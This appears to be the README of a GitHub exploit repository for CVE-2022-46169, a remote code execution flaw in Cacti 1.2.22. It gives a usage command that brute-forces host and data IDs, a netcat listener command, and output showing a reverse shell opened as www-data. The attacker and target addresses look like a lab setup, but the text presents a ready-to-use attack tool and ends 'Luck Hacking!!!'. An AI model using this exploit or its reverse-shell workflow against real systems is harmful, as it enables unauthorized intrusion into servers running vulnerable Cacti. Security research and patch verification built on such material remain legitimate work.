# CVE-2022-46169-CACTI-1.2.22
This is a exploit of CVE-2022-46169 to cacti 1.2.22. This exploit allows through an RCE to obtain a reverse shell on your computer.
# Requirement
optparse
requests
# Usage
On a port on your machine listen and then run the exploit as follows.
```bash
python3 CVE-2022-46169.py  -u http://10.129.216.153 --LHOST=10.10.16.23 --LPORT=443
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```
And the reverse shell should appear on the listening port
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.216.153] 36828
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```
Luck Hacking!!!
